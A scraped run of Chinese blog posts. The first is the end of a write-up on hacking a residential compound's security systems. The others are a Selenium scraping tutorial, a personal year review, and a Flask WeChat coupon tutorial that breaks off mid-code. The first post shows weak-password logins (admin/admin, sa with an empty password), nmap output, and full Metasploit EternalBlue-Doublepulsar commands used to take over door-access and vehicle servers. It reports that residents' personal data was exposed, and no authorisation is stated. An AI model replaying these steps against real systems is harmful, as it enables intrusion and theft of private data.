	这个就有意思了，这是车牌识别系统，车辆入库的时候进行车牌识别，拍照存储的机器，也是全部admin admin弱口令直接登录，里面存储了些啥就不多说了，放两张图大家随意感受下</p><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=660"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201805/66b2ed3a453a052758a6162b58b9b135.png"" alt=""2018-05-21 16-38-26 的屏幕截图.png - 大小: 31.41 KB - 尺寸: 1181 x 704 - 点击打开新窗口浏览全图"" width=""900"" height=""537""></a></div><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=661"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201805/08397e3a61d2a1d7e208a8aa6322e4ff.png"" alt=""2018-05-21 16-39-06 的屏幕截图.png - 大小: 522.09 KB - 尺寸: 1335 x 704 - 点击打开新窗口浏览全图"" width=""900"" height=""475""></a></div><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=662"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201805/3fd8f1bbbe5084d71c65b2ef4ec82af8.png"" alt=""2018-05-21 16-39-29 的屏幕截图.png - 大小: 65.98 KB - 尺寸: 1335 x 704 - 点击打开新窗口浏览全图"" width=""900"" height=""475""></a></div>

<p>
	通过对这几种设备的归类扫描，最终确定了几台windows服务器
</p>
<pre class=""brush:bash;"">192.165.15.174
192.165.15.177
192.165.15.190
192.165.15.200
192.165.30.2</pre>
<p>
	使用Nmap扫描结果如下
</p>
<pre class=""brush:bash;""># Nmap 7.70 scan initiated Fri May 18 23:51:30 2018 as: nmap -iL something_ip.txt -oN scaned.txt -T4 --open
Nmap scan report for 192.165.15.174
Host is up (0.063s latency).
Not shown: 990 closed ports
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
1433/tcp  open  ms-sql-s
2383/tcp  open  ms-olap4
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown

Nmap scan report for 192.165.15.190
Host is up (0.046s latency).
Not shown: 992 closed ports
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown

Nmap scan report for 192.165.15.200
Host is up (0.030s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown

Nmap scan report for 192.165.30.2
Host is up (0.064s latency).
Not shown: 990 closed ports
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown

# Nmap done at Fri May 18 23:51:46 2018 -- 5 IP addresses (4 hosts up) scanned in 16.25 seconds</pre>
<p>
	很明显，四台机器都开了445端口，其中 <span style=""white-space:nowrap;"">192.165.15.174 开了1433端口，明显是sql server数据库，192.165.30.2还开了3389，这台机器是在门禁机里面见过，是门禁系统的服务器。</span> 
</p>
<p>
	下面就重点对这几台机器入手，使用msf扫描下看是不是都存在smb漏洞（ms17_010），这漏洞在局域网真的超级好用，扫描截图</p><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=663"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201805/584f085c27c67dd5aadb3bd1f76786e0.png"" alt=""screenshot from 2018-05-21 11-20-26.png - 大小: 224.4 KB - 尺寸: 1366 x 768 - 点击打开新窗口浏览全图"" width=""900"" height=""507""></a></div>发现只有192.165.15.174 不存在ms17_010，其他三台都存在，操作系统分别是

<p>
	192.165.15.190 win7 sp1 x86
</p>
<p>
	192.165.15.200 win7 sp1 x64
</p>
<p>
	192.165.30.2 win7 sp1 x86
</p>
<p>
	现在目标就非常明确了，但是有个问题，msf自带的利用模块只针对x64版本的操作系统，对于x86版本的系统只能使用其他工具，emmmmm....
</p>
<p>
	一阵思考之后，博主决定先搞定那台64位win7，为了能够正常的反弹shell回来，我把路由器改成桥接模式，本机电脑设置固定IP，这样我的机器就跟目标机器处于相同网络拓扑，反弹自然无压力</p><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=669"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201805/84b4429e976a962274b3718cdc0de887.png"" alt=""screenshot from 2018-05-19 00-01-27.png - 大小: 31.02 KB - 尺寸: 574 x 519 - 点击打开新窗口浏览全图"" width=""574"" height=""519""></a></div>so...

<p>
	msf的用法我这里就不多说了，如果真不知道，可以留言...给出一张run vnc的截图，拿下监控系统</p><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=664"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201805/b334ab1a63170f9cb2782241c496b3e4.png"" alt=""screenshot from 2018-05-19 01-47-41.png - 大小: 1.23 MB - 尺寸: 1366 x 768 - 点击打开新窗口浏览全图"" width=""900"" height=""507""></a></div><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=665"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201805/f3c5c47c54b231772f872d314f03bb76.png"" alt=""screenshot from 2018-05-19 01-55-37.png - 大小: 1.12 MB - 尺寸: 1366 x 768 - 点击打开新窗口浏览全图"" width=""900"" height=""507""></a></div><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=666"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201805/34d3b0183697554c5ec1d935a676f249.png"" alt=""screenshot from 2018-05-19 02-30-00.png - 大小: 1.07 MB - 尺寸: 1366 x 768 - 点击打开新窗口浏览全图"" width=""900"" height=""507""></a></div>有趣的是这台机器上居然安装了360安全卫士...

<p>
	注意看上面一张图的那个监控室，管理员面前有三台机器，所以另外两台我下一步就要搞定。
</p>
<p>
	上面说64位win7已经拿下，现在搞定32位机器，使用 https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit 这里的Ruby脚本即可，需要注意的是如果本机是kali 64位的需要安装 wine32，安装方法是
</p>
<pre class=""brush:bash;"">dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32</pre>
<p>
	而且全程操作需要在root下面，安装完wine32后执行一下 wine32 cmd.exe 这样会自动在/root下面创建.wine目录，这个目录msf会用到
</p>
<p>
	使用 
</p>
<pre class=""brush:bash;"">git clone https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit.git</pre>
<p>
	将脚本克隆到本地，然后把目录下的deps 目录和rb文件复制到msf的modules路径下，这样既可以使用了（PS：我这里只复制了rb脚本，deps没有复制过去所以命令不太一样），具体命令如下
</p>
<pre class=""brush:bash;"">msf &gt; use  exploit/windows/smb/eternalblue_doublepulsar
msf exploit(windows/smb/eternalblue_doublepulsar) &gt; set ETERNALBLUEPATH /home/poweroff/Github/Eternalblue-Doublepulsar-Metasploit/deps/
ETERNALBLUEPATH =&gt; /home/poweroff/Github/Eternalblue-Doublepulsar-Metasploit/deps/
msf exploit(windows/smb/eternalblue_doublepulsar) &gt; set DOUBLEPULSARPATH /home/poweroff/Github/Eternalblue-Doublepulsar-Metasploit/deps/
DOUBLEPULSARPATH =&gt; /home/poweroff/Github/Eternalblue-Doublepulsar-Metasploit/deps/
msf exploit(windows/smb/eternalblue_doublepulsar) &gt; set TARGETARCHITECTURE x86
TARGETARCHITECTURE =&gt; x86
msf exploit(windows/smb/eternalblue_doublepulsar) &gt; set PROCESSINJECT  wlms.exe
PROCESSINJECT =&gt; wlms.exe
msf exploit(windows/smb/eternalblue_doublepulsar) &gt; show targets

Exploit targets:

   Id  Name
   --  ----
   0   Windows XP (all services pack) (x86) (x64)
   1   Windows Server 2003 SP0 (x86)
   2   Windows Server 2003 SP1/SP2 (x86)
   3   Windows Server 2003 (x64)
   4   Windows Vista (x86)
   5   Windows Vista (x64)
   6   Windows Server 2008 (x86) 
   7   Windows Server 2008 R2 (x86) (x64)
   8   Windows 7 (all services pack) (x86) (x64)


msf exploit(windows/smb/eternalblue_doublepulsar) &gt; set target 8
target =&gt; 8
msf exploit(windows/smb/eternalblue_doublepulsar) &gt; set rhost
set rhost  
msf exploit(windows/smb/eternalblue_doublepulsar) &gt; set rhost 192.165.15.190
rhost =&gt; 192.165.15.190
msf exploit(windows/smb/eternalblue_doublepulsar) &gt; set lhost 192.165.7.11
lhost =&gt; 192.165.7.11
msf exploit(windows/smb/eternalblue_doublepulsar) &gt; exploit</pre>
<p>
	不出意外的话攻击就成功了，给出攻击成功的截图。
</p>
<p>
	第一个是门禁系统，没装杀毒软件，就只有一些门禁卡管理软件</p><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=667"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201805/573e32702a9c70efe518629bd17db9a3.png"" alt=""screenshot from 2018-05-21 12-05-58.png - 大小: 1.02 MB - 尺寸: 1366 x 768 - 点击打开新窗口浏览全图"" width=""900"" height=""507""></a></div>

<p>
	第二个系统是车辆管理系统，车辆出入库时候用的</p><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=668"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201805/5b3e507778b081dace7b0f360d054cbf.png"" alt=""screenshot from 2018-05-21 12-41-30.png - 大小: 743.35 KB - 尺寸: 1366 x 768 - 点击打开新窗口浏览全图"" width=""900"" height=""507""></a></div>

<h2>
	总结
</h2>
<p>
	好了，至此，博主对小区的安防系统进行了简单的渗透测试，成功拿下关键系统，其中在服务器中还发现了大量的敏感文件，包括业主的个人信息，车辆信息，车辆出入登记信息等等，难怪说各种骚扰电话，这简直要分分钟泄露。
</p>
<h2>
	后记
</h2>
<p>
	安全是一个整体，千里之堤溃于蚁穴，下一次把门禁卡的复制破解还有自动控制升降杠的综合在一起再写一篇。
</p>
<h2>
	补充
</h2>
<p>
	在翻看磁盘文件的时候找到了车牌识别系统，在虚拟机中安装后，打开，使用ｓａ超级用户，密码为空成功登录到文章里面提到的那台ｓｑｌｓｅｒｖｅｒ服务器，但是由于这套系统会检测加密狗，要想正常使用可以使用ＯＤ绕过，这里就不操作了</p><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=682"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201807/8d7385fed55b9280329d0bf0eca52250.png"" alt=""微信图片_20180716142043.png - 大小: 34.58 KB - 尺寸: 400 x 437 - 点击打开新窗口浏览全图"" width=""400"" height=""437""></a></div><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=681"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201807/cf1070a6c1049bad0d19d0f15ac76e1d.png"" alt=""微信图片_20180716142038.png - 大小: 20.51 KB - 尺寸: 388 x 271 - 点击打开新窗口浏览全图"" width=""388"" height=""271""></a></div><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=680"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201807/16500c902380f6642c8d0fc46af038d2.png"" alt=""微信图片_20180716142032.png - 大小: 847.89 KB - 尺寸: 1280 x 900 - 点击打开新窗口浏览全图"" width=""900"" height=""633""></a></div><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=683"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201807/7316e1206d6e7bdabcc0186bb0e2b093.png"" alt=""微信图片_20180716160322.png - 大小: 45.35 KB - 尺寸: 746 x 685 - 点击打开新窗口浏览全图"" width=""746"" height=""685""></a></div>
<div class=""useWarning"" style=""background-color: #f0f0f0"">
本文链接：https://www.92ez.com/?action=show&amp;id=23469 <br>
                        <b>!!! 转载请先联系non3gov@gmail.com授权并在显著位置注明作者和原文链接 !!! <a href=""https://www.92ez.com/black.html"" target=""_blank"" style=""color: #000;text-decoration: underline;background: none"">小黑屋</a> </b><br>
提示：技术文章有一定的时效性，请先确认是否适用你当前的系统环境。
</div>

<style type=""text/css"">
.useWarning a{color:#fff;background-color:#ea6f5a;border-radius:3px;padding:5px 10px;text-decoration: none;}
.tuijian{margin-top:10px;}
.tuijian a{display:block;}
.tuijian img{padding:0;margin:0;}
.tuijian a img{display:block;width:100%;}
.donateme{font-size: 14px;display:none;}
.donateme a{color: green;font-weight: bold;}
.useWarning{padding: 5px 10px;border: #c00 1px dashed;margin: 10px 0 0;color: #c00;}
</style>
</div>","KBdancer, 发表于 2018-05-20, 12:02 AM. 
发表在：
								
 ,攻击测试,
								
,  ,Python,
								
,  ,原创,
",我是如何一步一步搞定小区的安防系统
"<div class=""post-body"">
<h2>
	<strong><span style=""color:#E53333;"">原文地址：https://www.jianshu.com/p/2526c26f8ecd</span></strong> 
</h2>
<h2>
	前言
</h2>
<p>
	selenium2 + 无界面浏览器 + pyquery 是个人认为功能最强大的爬虫组合(这一套本来是用做自动化测试的)，有人问为啥不是bs4而是pyquery，因为我对jquery很熟悉，而且我不喜欢bs4的查询语法，所以我选择了pyquery来降低学习成本，仅此而已。
</p>
<p>
	这中间的无界面浏览器，最常见的是PhantomJS，但是selenium说人家phantomjs不思进取，声明将来不给它玩了(运行时会抛出""Selenium support for PhantomJS has been deprecated, please use headless versions of Chrome or Firefox instead""的警告)，所以建议还是用headless版本的chrome或者firefox来替代。
</p>
<p>
	接下来让我们开始吧。
</p>
<h3>
	安装
</h3>
<h4>
	安装selenium2
</h4>
<pre class=""brush:bash;"">pip3 install selenium</pre>
<p>
	或者
</p>
<pre class=""brush:bash;"">pip install selenium</pre>
视你的python版本和环境而定。
<h4>
	安装 pyquery
</h4>
<pre class=""brush:bash;"">pip3 install pyquery</pre>
<p>
	我们建议handless版本的浏览器，比如chrome。
</p>
<h4>
	安装Xvfb 一个仿真的视窗框架。可以让没有显示硬件的设备虚拟一个显示设备。
</h4>
<pre class=""brush:bash;"">sudo apt-get install xvfb</pre>
<h4>
	安装PyVirtualDisplay，这是一个Xvfb的包装器。
</h4>
<pre class=""brush:bash;"">pip3 install pyvirtualdisplay</pre>
<h4>
	安装chrome（<span style=""color:#E53333;"">此处应该有梯子，要从谷歌下载文件</span>）
</h4>
<p>
	第一步，加入源列表
</p>
<pre class=""brush:bash;"">sudo wget http://www.linuxidc.com/files/repo/google-chrome.list -P /etc/apt/sources.list.d/</pre>
<p>
	第二步 导入公钥
</p>
<pre class=""brush:bash;"">wget -q -O - https://dl.google.com/linux/linux_signing_key.pub  | sudo apt-key add -</pre>
<p>
	第三步 更新源列表
</p>
<pre class=""brush:bash;"">sudo apt-get update</pre>
<p>
	第四步 安装chrome （这里安装chrome仅仅是在需要看到执行过程，如果不需要看到执行过程，可以不安装，使用chromedriver即可）
</p>
<pre class=""brush:bash;"">sudo apt-get install google-chrome-stable</pre>
<p>
	安装完成下载chromedriver也就是handless版本的chrome（注意自备梯子）。
</p>
<p>
	https://chromedriver.storage.googleapis.com/index.html?path=2.35/
</p>
<p>
	<span style=""color:#E53333;"">注意：https://chromedriver.storage.googleapis.com/index.html 这个页面所显示的版本号2.9是旧版本，当前时间2018-02-07最新版本是2.35，请不要搞混了，否则会因为版本不一致导致报错</span> 
</p>
<pre class=""brush:bash;"">unknown error: Runtime.executionContextCreated has invalid ‘context’: {“auxData”:{“frameId”:”11740.1”,”isDefault”:true},”id”:1,”name”:”“,”origin”:”://”}
(Session info: chrome=54.0.2840.71) </pre>
<p>
	参考文章：http://blog.csdn.net/c08762/article/details/70339587
</p>
<p>
	你也可以自行搜索chromedriver的下载地址,解压是个可执行文件，放到chrome的目录即可。
</p>
<p>
	一般ubuntu下面，chrome的目录是/opt/google/chrome/
</p>
<p>
	（注意：这里也可以放在任意位置，比如博主自己经常需要写脚本打包带走，所以直接放在了自己的脚本作为的路径下）
</p>
<p>
	通过以上准备基本都齐了，我们来上一段代码：<br>
接下来是一个简单的操作，打开一个页面，输入密码，执行一段脚本，输入一些数据，然后提交
</p>
<pre class=""brush:py;"">#  -*- coding: utf-8 -*-
from selenium import webdriver
from pyvirtualdisplay import Display
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as ec
from selenium.webdriver.support.select import By

import datetime
import time
import os

""""""演示""""""

display = Display(visible=0, size=(1024, 768))
# display.start()   # 开启虚拟显示器

""""""
https://chromedriver.storage.googleapis.com/index.html?path=2.35/
你也可以自行搜索chromedriver的下载地址,解压是个可执行文件,放到chrome的目录即可.
一般ubuntu下面,chrome的目录是/opt/google/chrome/
""""""
chrome_driver = ""/opt/google/chrome/chromedriver""  # chromedriver的路径
os.environ[""ChromeDriver""] = chrome_driver  # 必须配置,否则会在execute_script的时候报错.
browser = webdriver.Chrome(chrome_driver)
wait = WebDriverWait(browser, 10)

url_1 = ""https://some_url""
browser.get(url=url_1)  # 打开页面

# 密码输入按钮
input_password = wait.until(ec.presence_of_element_located((By.CSS_SELECTOR, "".x-layout-table input[type='password']"")))
# 提交按钮
submit_password = wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, "".x-layout-table .x-btn span"")))

input_password.send_keys(""password"")  # 输入密码
time.sleep(1)
submit_password.click()  # 提交密码

time.sleep(3)  # 等待是为了给页面时间载入
# 修改时间选择器输入框脚本
js_datepicker = """"""let d = $("".widget-wrapper&gt;ul&gt;li:first input""); d.val(""{}"");"""""".\
    format(datetime.datetime.now().strftime(""%F""))
browser.execute_script(js_datepicker)  # 输入时间

js_name = """"""let d = $("".widget-wrapper&gt;ul&gt;li:eq(1) input""); d.val(""{}"");"""""".format(""测试人员"")
browser.execute_script(js_name)  # 输入姓名

js_phone = """"""let d = $("".widget-wrapper&gt;ul&gt;li:eq(2) input""); d.val(""{}"");"""""".format(""18888888888"")
browser.execute_script(js_phone)  # 输入电话

js_desc_1 = """"""let d = $("".widget-wrapper&gt;ul&gt;li:eq(3) input""); d.val(""{}"");"""""".format(""测试信息."")
browser.execute_script(js_desc_1)  # 备注1

""""""selenium.common.exceptions.WebDriverException: Message: unknown error: cannot focus element""""""
""""""ec.presence_of_all_elements_located方法可以取一组输入框,然后循环操作""""""
input_list = wait.until(ec.presence_of_all_elements_located((By.CSS_SELECTOR, "".widget-wrapper&gt;ul&gt;li input"")))  #输入组
submit_info = wait.until(ec.presence_of_element_located((By.CSS_SELECTOR, "".x-btn span"")))  # 提交资料按钮
submit_info.click()  # 提交信息

time.sleep(1)
browser.refresh()  # 刷新页面

time.sleep(10)
browser.quit()
# display.stop()  # 关闭虚拟显示器</pre>
<p>
	有关pyquery的内容这里略过了，熟悉jquery的童鞋凭感觉操作就行了，0学习成本。
</p><div class=""useWarning"" style=""background-color: #f0f0f0"">
本文链接：https://www.92ez.com/?action=show&amp;id=23468 <br>
                        <b>!!! 转载请先联系non3gov@gmail.com授权并在显著位置注明作者和原文链接 !!! <a href=""https://www.92ez.com/black.html"" target=""_blank"" style=""color: #000;text-decoration: underline;background: none"">小黑屋</a> </b><br>
提示：技术文章有一定的时效性，请先确认是否适用你当前的系统环境。
</div>

<style type=""text/css"">
.useWarning a{color:#fff;background-color:#ea6f5a;border-radius:3px;padding:5px 10px;text-decoration: none;}
.tuijian{margin-top:10px;}
.tuijian a{display:block;}
.tuijian img{padding:0;margin:0;}
.tuijian a img{display:block;width:100%;}
.donateme{font-size: 14px;display:none;}
.donateme a{color: green;font-weight: bold;}
.useWarning{padding: 5px 10px;border: #c00 1px dashed;margin: 10px 0 0;color: #c00;}
</style>
</div>","KBdancer, 发表于 2018-02-07, 2:42 PM. 
发表在：
								
 ,Python,
								
,  ,资源共享,
",使用Selenium2 + handless browser + pyquery 代替PhantomJS做更适合前端开发者的爬虫[转载]
"<div class=""post-body"">
<h2>
	2017
</h2>
<p>
	2017年是个多变的一年，前公司一个看好的项目被突然停止，被迫换了工作，虽然我不甘心就这么离开，但依然...为了生存...
</p>
<p>
	2017年我结婚了...
</p>
<p>
	2017年我住进了新房子，终于凑足了第10次搬家...
</p>
<p>
	2017年我没有挖洞了，但是安全技术没有放下，依然在研究，只不过更底层...
</p>
<p>
	2017年新公司的项目依然没有很好的起色，慢慢的变成了外包公司...
</p>
<p>
	2017年博客写的太少了...
</p>
<p>
	2017年基本上没有玩过无线电，因为被迫各种搬家，工具都压箱底...
</p>
<h2>
	2018
</h2>
<p>
	2018年注定是一个转变的一年，更多的时间更多的机会做自己的事情...
</p>
<p>
	2018年重新捡起无线电！
</p>
<p>
	2018年换一份工作，做更多有趣的事情，清除债务！
</p>
<p>
	2018年安全研究更偏向侧面攻击，工业自动化安全研究！
</p>
<p>
	2018年大数据人工智能功课做足，实现自己的一些小想法！
</p>
<p>
	2018年做更多的自动化软件...
</p>
<p>
	2018...
</p><div class=""useWarning"" style=""background-color: #f0f0f0"">
本文链接：https://www.92ez.com/?action=show&amp;id=23467 <br>
                        <b>!!! 转载请先联系non3gov@gmail.com授权并在显著位置注明作者和原文链接 !!! <a href=""https://www.92ez.com/black.html"" target=""_blank"" style=""color: #000;text-decoration: underline;background: none"">小黑屋</a> </b><br>
提示：技术文章有一定的时效性，请先确认是否适用你当前的系统环境。
</div>

<style type=""text/css"">
.useWarning a{color:#fff;background-color:#ea6f5a;border-radius:3px;padding:5px 10px;text-decoration: none;}
.tuijian{margin-top:10px;}
.tuijian a{display:block;}
.tuijian img{padding:0;margin:0;}
.tuijian a img{display:block;width:100%;}
.donateme{font-size: 14px;display:none;}
.donateme a{color: green;font-weight: bold;}
.useWarning{padding: 5px 10px;border: #c00 1px dashed;margin: 10px 0 0;color: #c00;}
</style>
</div>","KBdancer, 发表于 2018-02-05, 1:10 PM. 
发表在：
								
 ,随手记,
",总结2017计划2018
"<div class=""post-body"">
<h2>
	前言
</h2>
<p>
	博主上周接了一个小单子，是关于微信卡券，博主原来主要精力和工作内容属于前端开发，后来学习了Python后发现自己居然也会写后端了，于是一发不可收拾，自学Django和Flask之后发现还是写后端比较有意思，业余时间也接一些小的外包单子挣点零花。外包项目多数是跟微信相关，但是关于微信卡券，博主还真是第一次开发，遇到的坑不少，做此记录，也给初学Python
 web的萌新一些入门知识。
</p>
众所周知，微信官方的开发者文档写的非常的烂，至于有多烂，同学们可以自行谷歌微信文档的坑，如果说你打算完全参考官方的文档进行开发，可能你永远都无法开发出来你想要的项目，so？老老实实参考第三方的民间文档吧，以免浪费宝贵的开发时间。
<h2>
	说明
</h2>
<p>
	这个项目实际开发时间为1.5天，其中被微信文档坑掉的时间大概占到了三分之二，所以说经验很重要。博主之前做过比较多基于微信的项目，在微信授权和jssdk应用上面还是比较熟悉的，这个项目的功能非常简单：
</p>
<p>
	微信授权获取用户信息保存到数据库，保存成功之后调用微信的jssdk唤起微信的卡券领取页面，用户领取成功之后更新数据库记录标示已领取。
</p>
<p>
	早前博主使用的是PHP开发过微信授权，用了第三方写的一个库，生成各种签名都是简单调用封装好的方法，简单易用，但是这次使用Python开发，虽然Gayhub上有很多第三方开源的封装库，但是我这里只需要简单的微信授权和卡券功能，并不需要那么强大，所以还是自己动手写个比较方便，温故而知新，再复习一下旧的知识也是相当不错的。
</p>
<h2>
	开发
</h2>
<p>
	此项目前端页面使用了如下开源库：
</p>
<p>
	vuejs 这个就不用说了，最近很火
</p>
<p>
	weui.js 微信官方团队开源的微信生态UI组件库
</p>
<p>
	axios.js vue推荐的前端ajax方案，使用起来很棒
</p>
<p>
	后端：Flask（Flask, render_template, request, session, jsonify, redirect）
</p>
<p>
	数据库：Mysql
</p>
<p>
	由于项目很小，这里就没有使用前后完全分离开发，直接使用了Flask的Jinja2模板引擎进行页面的渲染，Jinja2的页面渲染识别符号是{{ }}，由于vuejs也是使用的{{  }}作为识别符，为了避免冲突，我这里将Jinja2的识别符修改成了[[  ]]，也是挺好看的。使用如下代码进行设置
</p>
<pre class=""brush:py;"">app.jinja_env.variable_start_string = '[[ '
app.jinja_env.variable_end_string = ' ]]'</pre>
项目里面生成微信Token之类的需要跟微信的服务器进行交互，所以用到了 requests 库，生成签名用的是sha1算法，用的库是 hashlib，为了防止csrf攻击，生成随机字符串需要用到 random，对数据进行json转换的操作用 json 库，生成数据报表用xlwt库来操作excel文件，使用time库生成时间戳，微信签名也需要用到它，获取当前项目路径用sys库，os库用来判断文件或者路径是否存在。
<p>
	Flask里面对Mysql数据库操作用的是Flask-Mysql，当然也可以使用Python-Mysql，这个取决于个人需要，使用方法都差不多，总结一下用到的库，大概就是下面这些了
</p>
<pre class=""brush:py;"">from flask import Flask, render_template, request, session, jsonify, redirect
from flaskext.mysql import MySQL
import requests
import hashlib
import random
import json
import xlwt
import time
import sys
import os</pre>
Flask项目里面使用session的话需要有一段随机字符串作为安全密钥，比如说我这里写的是
<pre class=""brush:py;"">app.secret_key = 'A0Zr98j/3yX R~XHH!jmNT'</pre>
这个自己生成就好了，如果没有这玩意 session 就没法用。
<p>
	为了方便对数据库的操作，我这里写了通用的类
</p>
<pre class=""brush:py;"">mysql_object = MySQL()
app.config['MYSQL_DATABASE_USER'] = 'user'
app.config['MYSQL_DATABASE_PASSWORD'] = 'sadjni3u8asnd3'
app.config['MYSQL_DATABASE_DB'] = 'wanshang_coupon'
app.config['MYSQL_DATABASE_HOST'] = '127.0.0.1'
mysql_object.init_app(app)


class Database:
    def __init__(self):
        self.connection = mysql_object.connect()
        self.cursor = self.connection.cursor()

    def insert(self, query, params):
        try:
            self.cursor.execute(query, params)
            self.connection.commit()
        except Exception as e:
            print(e)
            self.connection.rollback()

    def query(self, query, params):
        self.cursor.execute(query, params)
        return self.cursor.fetchall()

    def __del__(self):
        self.connection.close()</pre>
项目比较小，query和insert够用了，insert也可用于update。关于项目的完整代码就不贴出来了，也没啥用，下面就说一些关键点吧。
<p>
	首先用户进入首页，会进行微信的授权，代码如下
</p>
<pre class=""brush:py;"">@app.route(""/"")
def index():
    appid = ""wx*************""
    redirect_uri = ""http%3A%2F%2Fcoupon.abc.com%2Fauthorization""
    csrf_state = str(random.randint(0, 10000)) + ''.join(random.sample('abcdefghijk', 5))
    session[""csfr_token""] = csrf_state
    wx_code_url = ""https://open.weixin.qq.com/connect/oauth2/authorize?appid=%s&amp;redirect_uri=%s&amp;response_type=code&amp;scope=snsapi_userinfo&amp;state=%s#wechat_redirect"" % (appid, redirect_uri, csrf_state)
    return redirect(wx_code_url)</pre>
<p>
	微信的授权是分步骤进行的，上面的代码是获取一个code，有了这个code才能去拿token，上面代码中需要注意的是 redirect_uri 这个变量一定要进行url编码，否则微信会报异常，csrf_state 变量是生成一个随机字符串，用于防止csrf跨站攻击，微信文章说不加也可以，为了安全起见，咱们还是加上去吧，谁叫咱们是搞安全的呢。
</p>
<p>
	这个csrf_state会在获取到code后微信重定向回来时带在url后面，所以下一步是可以拿到这个参数的。
</p>
<p>
	session[""csfr_token""] = csrf_state 这个就很简单了，把这个随机字符串写入到session，这样在下一步操作的时候会去检查进行比对。
</p>
<p>
	这里我要说明一下为何需要这个 csrf_state 参数，微信授权在获取code的时候，请求是通过前端的URL进行跳转，url跳转很明显的一个问题就是明文传输，明文传输的时候arp攻击是很容易拿到请求链接的，如果说我们实现已经在服务器上的session里面存储了那个随机字符串，微信回调回来的时候服务器拿到参数进行比对，如果这个参数值跟session里面的一致，则认为是正常的请求，否则这个请求就是伪造的，比如典型的请求重放攻击，在这里就用不了了，就算被arp拿到了链接，发过去服务器也会认为请求非法所以我还是建议加上这个参数。
</p>
<p>
	Flask跳转使用redirect方法。
</p>
<p>
	下面是关键的授权部分，获取授权Token的回调链接在上一步已经给出，微信会自动回调到这个页面，相关注释我直接在代码里面写了
</p>
<pre class=""brush:py;"">@app.route(""/authorization"")
def authorization():
    page_status = ""1""
    wx_code = request.args.get(""code"")  # Flask 获取 get请求的值用request.args，获取post请求用request.form，获取前端ajax的json数据用request.data，这里的code是微信回调的时候加上去的
    csrf_state = request.args.get(""state"") # 这个state是微信回调回来的时候带上去的，是之前我们自己生成的随机字符串
    if session[""csfr_token""] != csrf_state: # 随机字符串的校验，校验失败就跳转首页
        return redirect(""http://coupon.abc.com"")
    else:
        appid = ""wx****************""
        app_secret = ""*********************""
        wx_login_token_url = ""https://api.weixin.qq.com/sns/oauth2/access_token?appid=%s&amp;secret=%s&amp;code=%s&amp;grant_type=authorization_code"" % (appid, app_secret, wx_code)
        try:
            wx_login_token = requests.get(url=wx_login_token_url, timeout=15).json() # 获取一个token

            session['openid'] = wx_login_token['openid'] # 微信返回的openid，同时返回了一个授权用的Token，这个授权token是没有次数限制的，区别于基础功能的access_token，这里把openid作为session来全局判断登录状态

            access_token = get_access_token(appid, app_secret)  # 单独写了一个获取基础功能access_tokende 的方法，这个是有次数限制的，每天2000次，用完就gg了，所以需要做特殊的缓存操作，下面会详细说
            jsapi = get_ticket(access_token['access_token'], ""jsapi"")  # 这个单独的方法是获取通用jssdk需要的ticket方法，ticket的使用也有次数限制，所以也需要做缓存

            jsapi_ticket = jsapi['ticket']
            jsapi_timestamp = int(time.time())
            jsapi_current_url = request.url
            jsapi_noncestr = createNonceStr()

            before_string = ""jsapi_ticket=%s&amp;noncestr=%s&amp;timestamp=%s&amp;url=%s"" % (jsapi_ticket, jsapi_noncestr, jsapi_timestamp, jsapi_current_url)
            sha = hashlib.sha1(before_string.encode('utf8'))
            jsapi_signature = sha.hexdigest()

            jssdk_data = {
                ""appId"": appid,
                ""timestamp"": str(jsapi_timestamp),
                ""nonceStr"": jsapi_noncestr,
                ""signature"": jsapi_signature,
            }
            # 以上这一段是生成jssdk用的签名等参数，这些参数用于基础jssdk的各种功能调用

            card_id = ""p1NnvjhhcMvSHx××××××××××××××""
